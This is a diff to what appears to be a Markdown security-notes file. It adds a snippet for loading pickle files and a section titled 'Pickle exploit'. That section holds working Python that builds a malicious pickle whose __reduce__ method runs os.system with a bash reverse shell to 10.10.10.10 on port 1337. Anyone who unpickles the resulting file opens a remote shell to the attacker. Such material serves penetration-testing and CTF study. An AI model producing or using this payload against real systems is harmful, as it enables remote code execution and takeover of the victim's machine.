@@ -403,6 +403,35 @@ b'\xff\x01'
 
 ```
 
+
+To un-pickle the data you can: [Ref](https://stackoverflow.com/questions/24906126/how-to-unpack-pkl-file)
+```python
+import pickle
+
+
+with open('serialized.pkl', 'rb') as f:
+    data = pickle.load(f)
+```
+
+Pickle exploit
+```python
+import pickle, base64, os
+
+
+class RCE:
+    def __reduce__(self):
+        cmd = ("/bin/bash -c 'exec bash -i &>/dev/tcp/10.10.10.10/1337 <&1'")
+        return os.system, (cmd,)
+
+
+if __name__ == "__main__":
+    with open('badpickle.pkl', 'wb') as f:
+        pickle.dump(RCE(),f)
+    # Test with:
+    #with open('badpickle.pkl', 'rb') as f:
+    #    data = pickle.load(f)
+```
+
 # Appendix
 
 ## Tips for cleaner code
